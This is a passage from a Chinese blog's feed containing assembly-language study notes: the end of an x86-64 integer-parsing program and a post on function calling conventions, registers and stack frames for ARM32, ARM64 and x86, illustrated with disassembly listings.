class="built_in">r9</span>, <span class="number">0</span>               <span class="comment">; int1</span></span><br><span class="line">    <span class="keyword">movsx</span> <span class="built_in">rax</span>, <span class="built_in">byte</span>[<span class="built_in">r14</span>+<span class="built_in">r8</span>]</span><br><span class="line">    <span class="keyword">call</span> check_start</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0x2d</span>               <span class="comment">; whether the int2 is negative</span></span><br><span class="line">    <span class="keyword">jnz</span> repeat_int1</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r12</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">repeat_int1:</span></span><br><span class="line">    <span class="keyword">movsx</span> <span class="built_in">rax</span>, <span class="built_in">byte</span>[<span class="built_in">r14</span>+<span class="built_in">r8</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0x30</span>           </span><br><span class="line">    <span class="keyword">jl</span> int2</span><br><span class="line">    <span class="keyword">call</span> check_int</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="number">0xa</span></span><br><span class="line">    <span class="keyword">imul</span> <span class="built_in">r9d</span>, <span class="built_in">ebx</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">rax</span>, <span class="number">0x30</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r9</span>,<span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">r8</span></span><br><span class="line">    <span class="keyword">jmp</span> repeat_int1            <span class="comment">; access each number of int1[i] in turn</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">int2:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r11</span>, <span class="built_in">r8</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">r8</span></span><br><span class="line">    <span class="keyword">movsx</span> <span class="built_in">rax</span>, <span class="built_in">byte</span>[<span class="built_in">r14</span>+<span class="built_in">r8</span>]</span><br><span class="line">    <span class="keyword">call</span> check_start</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0x2D</span>              <span class="comment">; whether the int2 is negative </span></span><br><span class="line">    <span class="keyword">jnz</span> repeat_int2</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r13</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">repeat_int2:</span></span><br><span class="line">    <span class="keyword">movsx</span> <span class="built_in">rax</span>, <span class="built_in">byte</span>[<span class="built_in">r14</span>+<span class="built_in">r8</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">jz</span> over</span><br><span class="line">    <span class="keyword">call</span> check_int</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="number">0xa</span></span><br><span class="line">    <span class="keyword">imul</span> <span class="built_in">r10d</span>, <span class="built_in">ebx</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">rax</span>, <span class="number">0x30</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r10</span>,<span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">r8</span></span><br><span class="line">    <span class="keyword">jmp</span> repeat_int2            <span class="comment">; access each number of int2[i] in turn</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">over:</span></span><br><span class="line">    <span class="keyword">movsx</span> <span class="built_in">rax</span>, <span class="built_in">byte</span>[<span class="built_in">r14</span>+<span class="built_in">r11</span>]</span><br><span class="line">    <span class="keyword">call</span> calculate</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, decimal         <span class="comment">; first argument</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rax</span>            <span class="comment">; second argument</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span>              </span><br><span class="line">    <span class="keyword">call</span> printf             <span class="comment">; call the printf</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span>              <span class="comment">; stop the program</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">int</span> <span class="number">80h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">error:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, string         <span class="comment">; first argument</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, error_msg      <span class="comment">; second argument</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span>              </span><br><span class="line">    <span class="keyword">call</span> printf             <span class="comment">; call the printf</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span>              <span class="comment">; stop the program</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">int</span> <span class="number">80h</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;assembly language,缩写为 asm，中文译为汇编语言.&lt;br&gt;ARM 是一种指令集机器, 一种芯片架构, 对应的汇编arm32, arm64(两个基本上都没逆过);&lt;br&gt;x86表示的是CPU指令集类型; x86-64也是CPU的指令集类型, intel的 是另一种芯片架构, Windows&amp;amp;Linux。&lt;/p&gt;
&lt;p&gt;写到一半发现犯了根本性错误, &lt;strong&gt;我接触的汇编的版本其实就只有 x64 和 x86&lt;/strong&gt;, Linux上的只是编译器不和Windows相通而已&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Sketches" scheme="http://Ronpa.top/tags/Sketches/"/>
    
  </entry>
  
  <entry>
    <title>函数调用基础知识</title>
    <link href="http://ronpa.top/2020/11/05/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://ronpa.top/2020/11/05/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
    <published>2020-11-05T23:02:16.000Z</published>
    <updated>2021-01-25T19:18:51.460Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>汇编基础知识</p></blockquote><a id="more"></a><h1 id="arm32"><a href="#arm32" class="headerlink" title="arm32"></a>arm32</h1><h2 id="指令结构"><a href="#指令结构" class="headerlink" title="指令结构"></a>指令结构</h2><p>32位<br><img src="/2020/11/05/函数调用基础知识/arm指令结构.png" alt></p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">37</span>个寄存器 <span class="number">31</span>个通用寄存器 <span class="number">6</span>个状态寄存器</span><br><span class="line">通用寄存器 <span class="built_in">r0</span>-<span class="built_in">r15</span></span><br><span class="line"><span class="built_in">r15</span> PC 程序计数器 存当前地址相当于x86的<span class="built_in">eip</span></span><br><span class="line"><span class="built_in">r14</span> LR 子程序返回地址 连接寄存器</span><br><span class="line"><span class="built_in">r13</span> <span class="built_in">SP</span> 栈顶</span><br><span class="line"><span class="built_in">r12</span> <span class="built_in">IP</span> 内部过程调用寄存器</span><br><span class="line"><span class="built_in">r11</span> FP 帧指针 帧栈寄存器</span><br><span class="line"><span class="built_in">r10</span> sl 栈限制</span><br><span class="line">CPSR 当前程序状态寄存器</span><br><span class="line">SPSR 备份状态寄存器，用于在程序异常终端时保存被中断程序的状态</span><br></pre></td></tr></table></figure><h2 id="调用过程"><a href="#调用过程" class="headerlink" title="调用过程"></a>调用过程</h2><h3 id="压栈顺序"><a href="#压栈顺序" class="headerlink" title="压栈顺序"></a>压栈顺序</h3><p>依次为<strong>当前函数指针PC、返回指针LR、栈指针SP、栈基址FP、传入参数个数及指针、本地变量和临时变量</strong></p><p><strong>相比于x86，ARM更为鲜明的特点是，两个栈空间内的地址（SP+FP）前面，必然有两个代码地址（PC+LR）明确标示着调用函数位置内的某个地址</strong></p><h3 id="压栈和出栈"><a href="#压栈和出栈" class="headerlink" title="压栈和出栈"></a>压栈和出栈</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">stmfd </span><span class="built_in">sp</span>!, &#123;<span class="built_in">r0</span>-<span class="built_in">r9</span>, <span class="built_in">lr</span>&#125; <span class="comment">; 满递减压栈,压入寄存器r0-r9,lr压栈,sp不断减4 </span></span><br><span class="line"><span class="keyword">ldmfd </span><span class="built_in">sp</span>!, &#123;<span class="built_in">r0</span>-<span class="built_in">r9</span>, <span class="built_in">pc</span>&#125; <span class="comment">; 满递减出栈,给寄存器r0-r9出栈，并使程序跳转回函数的调用点,sp不断增4</span></span><br></pre></td></tr></table></figure><h3 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h3><p>不同于x86的参数传递规则，ATPCS建议函数的形参不超过4个，<strong>如果形参个数少于或等于4，则形参由R0,R1,R2,R3四个寄存器进行传递；若形参个数大于4，大于4的部分必须通过堆栈进行传递。</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c, <span class="keyword">int</span> d)</span></span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="keyword">func</span><span class="params">(i, j, 3, 4)</span>;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应汇编:</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span><span class="built_in">D0</span> main                                    <span class="comment">; DATA XREF: .text:000082C4o</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span><span class="built_in">D0</span>                                         <span class="comment">; .text:off_82DCo</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span><span class="built_in">D0</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span><span class="built_in">D0</span> <span class="keyword">b </span>              = -<span class="number">0x14</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span><span class="built_in">D0</span> a               = -<span class="number">0x10</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span><span class="built_in">D0</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span><span class="built_in">D0</span> <span class="built_in">IP</span> = <span class="built_in">R12</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span><span class="built_in">D0</span> <span class="built_in">FP</span> = <span class="built_in">R11</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span><span class="built_in">D0</span>                 <span class="keyword">MOV </span>    <span class="built_in">IP</span>, <span class="built_in">SP</span>//备份栈顶指针</span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span><span class="built_in">D4</span>                 <span class="keyword">STMFD </span>  <span class="built_in">SP</span>!, &#123;<span class="built_in">FP</span>,<span class="built_in">IP</span>,<span class="built_in">LR</span>,<span class="built_in">PC</span>&#125;//使用堆栈操作指令<span class="keyword">stmfd将栈帧(FP)、IP、程序返回地址(LR)、程序计数器（PC）压栈</span></span><br><span class="line"><span class="keyword">.text:000083D8 </span>                <span class="keyword">SUB </span>    <span class="built_in">FP</span>, <span class="built_in">IP</span>, <span class="number">#4</span>//然后使用<span class="keyword">sub </span><span class="built_in">fp</span>,<span class="built_in">ip</span>,<span class="number">#4</span>使<span class="built_in">fp</span>指向当前函数栈帧的栈底</span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span>DC                 <span class="keyword">SUB </span>    <span class="built_in">SP</span>, <span class="built_in">SP</span>, <span class="number">#8</span>//<span class="keyword">sub </span><span class="built_in">sp</span>,<span class="built_in">sp</span>,<span class="number">#8</span>，为当前函数局部变量分配看空间</span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span>E0                 <span class="keyword">MOV </span>    <span class="built_in">R3</span>, <span class="number">#1</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span>E4                 <span class="keyword">STR </span>    <span class="built_in">R3</span>, [<span class="built_in">FP</span>,<span class="symbol">#a</span>]//将<span class="built_in">R3</span>中的字数据写入以<span class="built_in">FP</span>＋<span class="symbol">#a</span>为地址的存储器中</span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span>E8                 <span class="keyword">MOV </span>    <span class="built_in">R3</span>, <span class="number">#2</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span>EC                 <span class="keyword">STR </span>    <span class="built_in">R3</span>, [<span class="built_in">FP</span>,<span class="symbol">#b</span>]</span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span><span class="built_in">F0</span>                 <span class="keyword">LDR </span>    <span class="built_in">R0</span>, [<span class="built_in">FP</span>,<span class="symbol">#a</span>]</span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span><span class="built_in">F4</span>                 <span class="keyword">LDR </span>    <span class="built_in">R1</span>, [<span class="built_in">FP</span>,<span class="symbol">#b</span>]</span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span>F8                 <span class="keyword">MOV </span>    <span class="built_in">R2</span>, <span class="number">#3</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">000083</span>FC                 <span class="keyword">MOV </span>    <span class="built_in">R3</span>, <span class="number">#4</span>//通过寄存器传递参数<span class="built_in">r1</span>,<span class="built_in">r2</span>,<span class="built_in">r3</span>,<span class="built_in">r4</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">00008400</span>                 <span class="keyword">BL </span>     func//使用<span class="keyword">BL指令调用函数 </span>同时也会将当前指令的下一条指令地址赋给<span class="built_in">LR</span>,以跳转回来</span><br><span class="line"><span class="symbol">.text</span>:<span class="number">00008404</span>                 <span class="keyword">MOV </span>    <span class="built_in">R3</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">00008408</span>                 <span class="keyword">MOV </span>    <span class="built_in">R0</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">0000840</span>C                 <span class="keyword">SUB </span>    <span class="built_in">SP</span>, <span class="built_in">FP</span>, <span class="number">#0xC</span></span><br><span class="line"><span class="symbol">.text</span>:<span class="number">00008410</span>                 <span class="keyword">LDMFD </span>  <span class="built_in">SP</span>, &#123;<span class="built_in">FP</span>,<span class="built_in">SP</span>,<span class="built_in">PC</span>&#125;//恢复现场</span><br><span class="line"><span class="symbol">.text</span>:<span class="number">00008410</span> <span class="comment">; End of function main</span></span><br></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>A0 func                                    <span class="comment">; CODE XREF: main+30p</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>A0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>A0 var_1C          = <span class="number">-0x1C</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>A0 var_18          = <span class="number">-0x18</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>A0 var_14          = <span class="number">-0x14</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>A0 var_10          = <span class="number">-0x10</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>A0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>A0                 <span class="keyword">MOV</span>     <span class="built_in">R12</span>, SP</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>A4                 STMFD   SP!, &#123;<span class="built_in">R11</span>,<span class="built_in">R12</span>,LR,PC&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>A8                 <span class="keyword">SUB</span>     <span class="built_in">R11</span>, <span class="built_in">R12</span>, <span class="meta">#4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>AC                 <span class="keyword">SUB</span>     SP, SP, <span class="meta">#0x10</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>B0                 STR     <span class="built_in">R0</span>, [<span class="built_in">R11</span>,<span class="meta">#var_10]</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>B4                 STR     <span class="built_in">R1</span>, [<span class="built_in">R11</span>,<span class="meta">#var_14]</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>B8                 STR     <span class="built_in">R2</span>, [<span class="built_in">R11</span>,<span class="meta">#var_18]</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>BC                 STR     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="meta">#var_1C]</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>C0                 <span class="keyword">MOV</span>     <span class="built_in">R3</span>, <span class="meta">#1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>C4                 <span class="keyword">MOV</span>     <span class="built_in">R0</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>C8                 <span class="keyword">SUB</span>     SP, <span class="built_in">R11</span>, <span class="meta">#0xC</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>CC                 LDMFD   SP, &#123;<span class="built_in">R11</span>,SP,PC&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000083</span>CC <span class="comment">; End of function func</span></span><br></pre></td></tr></table></figure><h3 id="结果返回规则"><a href="#结果返回规则" class="headerlink" title="结果返回规则"></a>结果返回规则</h3><ol><li>结果为一个32位的整数时,可以通过寄存器R0返回. </li><li>结果为一个64位整数时,可以通过R0和R1返回，依此类推. </li><li>结果为一个浮点数时,可以通过浮点运算部件的寄存器f0,d0或者s0来返回. </li><li>结果为一个复合的浮点数时,可以通过寄存器f0-fN或者d0~dN来返回. </li><li>对于位数更多的结果,需要通过调用内存来传递.</li></ol><h3 id="arm-7种工作模式和2种工作状态"><a href="#arm-7种工作模式和2种工作状态" class="headerlink" title="arm 7种工作模式和2种工作状态"></a>arm 7种工作模式和2种工作状态</h3><p><a href="https://blog.csdn.net/ly930156123/article/details/79219303" target="_blank" rel="noopener">7种工作模式和2种工作状态</a></p><ol><li>ARM状态：32位，ARM状态执行<strong>字对齐</strong>的32位ARM指令。</li><li>Thumb状态，16位，执行<strong>半字对齐</strong>的16位指令。</li></ol><p><img src="/2020/11/05/函数调用基础知识/工作模式.png" alt></p><h2 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h2><ol><li>mov pc, &lt;跳转地址&gt;<br>这种向程序计数器PC直接写跳转地址，能在4GB连续空间内任意跳转。</li><li>通过 B BL BLX BX 可以完成在当前指令向前或者向后32MB的地址空间的跳转<br>B是最简单的跳转指令。跳的是相对地址——是相对当前PC值的一个偏移量<br>BL很常用,它在跳转之前会在寄存器LR(R14)中保存PC的当前内容。BL的经典用法如下：</li></ol><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bl </span>NEXT       <span class="comment">; 跳转到NEXT </span></span><br><span class="line">…… </span><br><span class="line"><span class="symbol">NEXT</span> </span><br><span class="line">…… </span><br><span class="line"><span class="keyword">mov </span><span class="built_in">pc</span>, <span class="built_in">lr</span>    <span class="comment">; 从子程序返回。</span></span><br></pre></td></tr></table></figure><h2 id="Thumb"><a href="#Thumb" class="headerlink" title="Thumb"></a>Thumb</h2><p>Thumb指令可以看做是ARM指令压缩形式的子集, 代码密度不同, 它具有16为的代码密度。Thumb不是一个完整的体系结构，不能指望处理程序只执行Thumb指令而不支持ARM指令集</p><p>Thumb指令集</p><ol><li>没有协处理器指令、信号量指令以及<strong>访问CPSR或SPSR的指令(状态寄存器)</strong></li><li>没有乘加指令及64位乘法指令等，且指令的第二操作数受到限制</li><li>除了跳转指令B有条件执行功能外，其他指令均为无条件执行</li><li>大多数Thumb数据处理指令采用2地址格式。</li></ol><h3 id="1-跳转指令"><a href="#1-跳转指令" class="headerlink" title="1. 跳转指令"></a>1. 跳转指令</h3><p>在范围上有更多的限制，转向子程序是无条件的转移<br>除了跳转指令B(分支指令)有条件执行功能外，其他指令均为无条件执行</p><h3 id="2-数据处理指令"><a href="#2-数据处理指令" class="headerlink" title="2. 数据处理指令"></a>2. 数据处理指令</h3><p>数据处理指令是对通用寄存器进行操作，在大多数情况下，操作的结果须放入其中一个操作数寄存器中，而不是第三个寄存器中<br>数据处理操作比ARM状态的更少<br>访问寄存器R8—R15的Thumb数据处理指令不能更新CPSR中的ALU状态标志</p><h3 id="3-单寄存器加载和存储指令"><a href="#3-单寄存器加载和存储指令" class="headerlink" title="3. 单寄存器加载和存储指令"></a>3. 单寄存器加载和存储指令</h3><p>单寄存器加载和存储指令只能访问寄存器R0—R7</p><h3 id="4-批量寄存器加载和存储指令"><a href="#4-批量寄存器加载和存储指令" class="headerlink" title="4. 批量寄存器加载和存储指令"></a>4. 批量寄存器加载和存储指令</h3><p>LDM和STM指令可以将任何范围为R0——R7的寄存器子集加载或存储</p><h1 id="arm64"><a href="#arm64" class="headerlink" title="arm64"></a>arm64</h1><h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p><strong>参数1~参数8 分别保存到 X0~X7 寄存器中</strong>, 剩下的参数从右往左依次入栈，<strong>被调用者实现栈平衡返回值存放在X0中.</strong></p><h1 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h1><blockquote><p>我们都知道x86平台下常用的有三种调用约定，<code>__cdecl、__stdcall、__fastcall</code></p></blockquote><h2 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h2><p>代码 全局 常量 堆栈<br><img src="/2020/11/05/函数调用基础知识/内存结构.png" alt><br><img src="/2020/11/05/函数调用基础知识/64位虚拟内存.png" alt></p><h2 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">通用寄存器：<span class="number">8</span>个，分别为<span class="built_in">EAX</span>,<span class="built_in">EBX</span>,<span class="built_in">ECX</span>,<span class="built_in">EDX</span>,<span class="built_in">ESP</span>,<span class="built_in">EBP</span>,<span class="built_in">ESI</span>,<span class="built_in">EDI</span></span><br><span class="line">标志寄存器：<span class="number">1</span>个，EFLAGS</span><br><span class="line">控制寄存器：<span class="number">5</span>个，分别为<span class="built_in">CR0</span>-<span class="built_in">CR4</span></span><br><span class="line">调试寄存器：<span class="number">8</span>个，分别为<span class="built_in">DR0</span>-DR7</span><br><span class="line">系统地址寄存器:<span class="number">4</span>个，GDTR、IDTR、LDTR和TR</span><br><span class="line"><span class="number">16</span>位段寄存器：<span class="number">6</span>个，分别为<span class="built_in">CS</span>,<span class="built_in">DS</span>,<span class="built_in">ES</span>,<span class="built_in">FS</span>,<span class="built_in">GS</span>,<span class="built_in">SS</span></span><br><span class="line">其他寄存器：<span class="built_in">EIP</span>、TSC等</span><br><span class="line"></span><br><span class="line"><span class="built_in">EAX</span> 是 累加器 , 它是很多加法乘法指令的缺省寄存器。</span><br><span class="line"></span><br><span class="line"><span class="built_in">EBX</span> 是 基地址 寄存器, 在内存寻址时存放基地址。</span><br><span class="line"></span><br><span class="line"><span class="built_in">ECX</span> 是计数器 是重复(<span class="keyword">REP</span>)前缀指令和<span class="keyword">LOOP</span>指令的内定计数器。</span><br><span class="line"></span><br><span class="line"><span class="built_in">EDX</span> 则总是被用来放整数除法产生的余数。</span><br><span class="line"></span><br><span class="line"><span class="built_in">ESI</span>/<span class="built_in">EDI</span> 分别叫做<span class="string">"源/目标索引寄存器"</span> 因为在很多字符串操作指令中, <span class="built_in">DS</span>:<span class="built_in">ESI</span>指向源串,而<span class="built_in">ES</span>:<span class="built_in">EDI</span>指向目标串.</span><br><span class="line"></span><br><span class="line"><span class="built_in">EBP</span> 栈底指针  在破解的时候,经常可以看见一个标准的函数起始代码:</span><br><span class="line"></span><br><span class="line"><span class="built_in">ESP</span> 栈顶指针 堆栈的顶部是地址小的区域，压入堆栈的数据越多，<span class="built_in">ESP</span>也就越来越小。在<span class="number">32</span>位平台上，<span class="built_in">ESP</span>每次减少<span class="number">4</span>字节。</span><br><span class="line"></span><br><span class="line"><span class="built_in">eip</span>：寄存器存放下一个<span class="meta">CPU</span>指令存放的内存地址，当<span class="meta">CPU</span>执行完当前的指令后，从<span class="built_in">EIP</span>寄存器中读取下一条指令的内存地址，然后继续执行。相当于arm里的 PC <span class="built_in">r15</span></span><br></pre></td></tr></table></figure><h2 id="调用过程-1"><a href="#调用过程-1" class="headerlink" title="调用过程"></a>调用过程</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">@ILT+<span class="number">145</span>(_GetProcAddress@<span class="number">8</span>):</span><br><span class="line"><span class="number">00411096</span> <span class="keyword">jmp</span> GetProcAddress (<span class="number">41394Eh</span>)</span><br><span class="line"><span class="symbol">Add:</span></span><br><span class="line">0041109B <span class="keyword">jmp</span> <span class="keyword">Add</span> (<span class="number">411410h</span>) //这些类似函数的跳转表，走到这里会直接<span class="keyword">jmp</span>到某个函数的函数头，只需要注意这条语句，之后会用到。</span><br><span class="line">@ILT+<span class="number">155</span>(@_RTC_CheckStackVars@<span class="number">8</span>):</span><br><span class="line">004110A0 <span class="keyword">jmp</span> _RTC_CheckStackVars (<span class="number">411950h</span>)  